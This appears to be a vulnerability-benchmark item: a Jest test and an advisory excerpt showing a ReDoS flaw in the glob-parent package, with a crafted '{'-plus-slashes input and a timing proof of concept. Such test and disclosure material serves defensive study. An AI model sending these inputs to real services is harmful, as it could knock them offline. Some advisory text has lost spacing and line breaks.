test("ReDos in glob-parent", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const globParent = require("glob-parent");
  let attack_str = "{" + genstr(3000, "/");
  let t = measureTime(function () {
    globParent(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});

advisory_descriptions:
glob-parentis a package that helps extracting the non-magic parent path from a glob string.Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). A ReDoS vulnerability exists in theenclosureregex.const { performance } = require("perf_hooks")
const globParent = require("glob-parent")const measure = fn => {
  let s = performance.now();
  fn();
  return performance.now() - s;
};for (const n of [5_000, 10_000, 20_000, 40_000, 80_000, 160_000]) {
  const input = "{" + "/".repeat(n);
  const time = measure(() => globParent(input));// if the runtime is O(n^2), then this ration will be roughly constant
  const ration = time / (n * n);console.log(${n}:\t${time}ms\t${ration.toExponential(3)});
}

